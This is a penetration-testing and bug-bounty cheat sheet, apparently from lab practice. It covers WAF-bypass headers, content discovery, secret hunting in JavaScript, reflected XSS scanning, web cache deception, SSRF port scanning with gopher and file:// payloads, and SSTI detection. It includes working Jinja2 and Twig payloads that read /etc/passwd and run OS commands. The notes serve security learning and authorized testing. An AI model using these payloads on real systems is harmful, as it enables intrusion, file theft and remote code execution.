VAPT/Bug Bounty Check List
+++++++++++++++++++++++++++++++++++++++++++
Links for Referance and Attacks
1. https://github.com/swisskyrepo/PayloadsAllTheThings
2.

+++++++++++++++++++++++++++++++++++++++++++
Links for tools
1. https://github.com/vladko312/SSTImap
+++++++++++++++++++++++++++++++++++++

*vulnerability*
---For waf bypass, and similar---
X-Forwarded-Host
X-Forwarded-Port
X-Forwarded-Scheme
Origin: null
Origin: [siteDomain].attacker.com
X-Frame-Options: Allow
X-Forwarded-For: 127.0.0.1
X-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1
_________________________________________________________________

Kali Tools

1. For Forced Browsing
feroxbuster -u <URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k

=> SSL Certificate Issue
Some apps (like yours) have invalid/misconfigured SSL.
Fix → tell feroxbuster to ignore SSL errors:
feroxbuster -u <URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k


______________________________________________________________________
FInding  FIND HIDDEN INFORMATION FORM JAVASCRIPT

1. katana -u https://URL -d 5 -jc | grep ".js$" | uniq | sort > dir.txt
2. git clone https://github.com/m4ll0k/SecretFinder.git
3. └─# python3 -m venv venv
4. └─# source venv/bin/activate
5. python -m pip install -r requirements.txt   
6. cat /home/kali/dir.txt | while read url; do python SecretFinder.py -i "$url" -o cli >> /home/kali/secret.txt; done

_______________________________________________________________________
To find Refelected XSS automation tool

1. Dalfox
git clone https://github.com/hahwul/dalfox
cd dalfox
go install
go build

=> if want to Run where cookies are needed
./dalfox url "https://URL=Branchcxxf7" \
  --cookie "ci_session=e69ca4tejrjhaq1rcpkaihcgje42ltis" \
  -o /tmp/dalfox_status_auth.json

=>./dalfox url "https://target.tld/page?param=test"
_________________________________________________________________________
Web cache deception

1. Cache rules are often set up to store static resources, which generally don't change frequently 
and are reused across multiple pages. Dynamic content is not cached as it's more likely to contain sensitive information, 
ensuring users get the latest data directly from the server.
2. Static file extension rules : .css for stylesheets or .js for JavaScript files.
3. Static directory rules : /static or /assets
4.File name rules - These rules match specific file names to target files that are universally required for web operations and 
change rarely, such as robots.txt and favicon.ico

Poin to Rember 
While testing for discrepancies and crafting a web cache deception exploit, make sure that each request you send has a different cache key. 
Otherwise, you may be served cached responses, which will impact your test results.
As both URL path and any query parameters are typically included in the cache key, you can change the key by adding a query string to the 
path and changing it each time you send a request. Automate this process using the Param Miner extension. To do this, once you've installed the extension, 
click on the top-level Param miner > Settings menu, then select Add dynamic cachebuster. Burp now adds a unique query string to every request that you make.
You can view the added query strings in the Logger tab.

Detecting Cached Responses

1. Check X-Cache Header (eg: X-Cache: hit)
   hit → Response served from cache
   miss → Response fetched from origin (send again, may turn into hit)
   dynamic → Content generated dynamically, not cached
   refresh → Cached content was outdated and revalidated

2. Check Cache-Control Header
   Look for public with max-age > 0 → Cacheable resource (not always guaranteed)

3. Compare Response Times
   Fast response → Likely cached
   Slow response → Likely from origin server

____________________________________________________________________________
SSRF (Server-Side Request Forgery)

1. Any URL parameter that is being called internally in a POST request can be tested for SSRF.
2. We can test this by providing a Burp Collaborator URL or by creating a listener using netcat:
   nc -lnvp 8000
   If we receive a hit or callback from the application, then it is vulnerable to SSRF.
3. If the response contains the web application's HTML code, the SSRF vulnerability is not blind,
   i.e., the response is displayed to us.
4. Enumerating the System:
   We can use the SSRF vulnerability to conduct a port scan of the internal system
   to identify running services.

   4.1 Give the URL:
       http://127.0.0.1:81

   4.2 If we supply a port that is closed (such as 81), we get an error message like:
       Failed to connect to port number

   4.3 This allows us to conduct an internal port scan of the web server through the SSRF vulnerability.
       We can automate this using a fuzzer like ffuf.
       First, create a wordlist of ports you want to scan:
           seq 1 10000 > ports.txt

   4.4 Use ffuf to fuzz ports and identify open ones:
       ffuf -w ./ports.txt -u http://URL/index.php -X POST \
       -H "Content-Type: application/x-www-form-urlencoded" \
       -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
       -fr "Failed to connect to"

       OR use a custom POST body based on your parameter:
       ffuf -w ./ports.txt -u http://URL/index.php -X POST \
       -H "Content-Type: application/x-www-form-urlencoded" \
       -d "<Post Body>" -fr "Error message shown when we try to connect"

5. Accessing Endpoints through SSRF Eg : http:// url/admin , /login etc ( SSRF to access restricted internal endpoints.)
    Eg: ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://URL/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" 
    -d "dateserver=http://SSRF/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
    Syntax : ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://URL/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" 
    -d "SSRF END BODY " -fr "Response of wrong"
6. LFI via SSRF 
   file:///etc/passwd
7. The gopher Protocol
8. Blind SSRF
A Blind SSRF (Server-Side Request Forgery) is a type of SSRF where the response is not directly visible to the attacker.
That means — when you send a malicious request (for example, pointing to your Burp Collaborator or nc listener), you won’t see the result or response in the application output.
However, the server still makes the request internally, and you can detect this by observing out-of-band (OOB) interactions such as:
A DNS lookup
An HTTP request
A TCP connection
on your external server (like Burp Collaborator, interact.sh, or netcat).

-> The application does not show any response or error related to your URL.
->But, you get a DNS or HTTP hit on your-burpcollaborator.com — That confirms it’s a Blind SSRF.
->ffuf -w ./ports.txt -u http://10.129.189.230/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
  -mr "Date is unavailable. Please choose a different date!" \
  -s | awk '{print $1}'
which is not avaiable 

-> ffuf -w ./ports.txt -u http://10.129.189.230/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
  -fr "Date is unavailable. Please choose a different date!" \
  -s | awk '{print $1}'
-> to display whic are avaiable
->https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html

Exploitation:internal portscan by accessing ports on localhost accessing restricted endpoints
Protocols: http://127.0.0.1/, file:///etc/passwd
gopher://<internal URL with :port>/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent
Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
________________________________________________________________________________________________________________
 SSTI
 Exploitation : Templating Engines are used to dynamically generate content
 Test String:  ${{<%[%'"}}%\.
 SSTI Tools : download a remote file to our local machine ( -D '/etc/passwd' './passwd'), 
              we can execute a system command using the -S flag (-S id)
               we can use --os-shell to obtain an interactive shell: --os-shell
   git clone https://github.com/vladko312/SSTImap.git
   cd SSTImap
   pip3 install -r requirements.txt
   python3 sstimap.py -u http://172.17.0.2/index.php?name=test
   


                            ┌─────────────┐
                            │   ${7*7}    │
                            └──────┬──────┘
                                   │
                    ┌──────────────┴──────────────┐
                    │                             │
             ┌──────▼──────┐               ┌──────▼──────┐
             │ a{*comment*}b│              │   {{7*7}}   │
             └──────┬──────┘               └──────┬──────┘
                    │                             │
         ┌──────────┴──────────┐         ┌────────┴────────┐
         │                     │         │                 │
 ┌───────▼───────┐      ┌──────▼──────┐  │         ┌───────▼────────┐
 │    Smarty     │      │${'z'.join('ab')}│         │   Not Vulnerable │
 └───────────────┘      └──────┬──────┘  │         └─────────────────┘
                               │         │
                      ┌────────┴───────┐ │
                      │                │ │
                ┌─────▼─────┐   ┌──────▼──────┐
                │   Mako    │   │   Unknown   │
                └───────────┘   └─────────────┘

                              │
                     ┌────────▼────────┐
                     │     {{7*7}}     │
                     └────────┬────────┘
                              │
                 ┌────────────┴────────────┐
                 │                         │
           ┌─────▼──────┐           ┌──────▼──────┐
           │   Jinja2   │           │    Twig     │
           └────────────┘           └─────────────┘
For Jinja2 the payload {{7*'7'}}  the result will be 7777777 if its 49 then its Twig

Exploiting SSTI - Jinja2
-> Python web frameworks such as Flask or Django, Flask web application
->  We can also execute Python code to obtain information about the web application's source code
-> Payload
   {{ config.items() }} ->  obtain internal information about the web application, dumps the entire web application configuration
   {{ self.__init__.__globals__.__builtins__ }} -> dump all available built-in functions
   {{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }} -> LFI,  we cannot call the function directly; we need 
                                                                              to call it from the __builtins__ dictionary we dumped earlier
-> Remote Code Execution (RCE)
To achieve remote code execution in Python, we can use functions provided by the os library, such as system or popen. However, 
if the web application has not already imported this library, we must first import it by calling the built-in function import. 
This results in the following SSTI payload:
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
in place of id we change to other command like
ls -R / -> Listing
pwd, ls -la etc other command too

Exploiting SSTI - Twig
-> Twig is a template engine for the PHP programming language.
-> Payload 
   {{ _self }} -> Information Disclose
   {{ "/etc/passwd"|file_excerpt(1,-1) }} - LFI
   {{ ['id'] | filter('system') }} - RCE -  use a PHP built-in function such as system. We can pass an argument to this function by using Twig's filter function
in place id replace with linux command like ls -la, cat etc
SSTI Tools
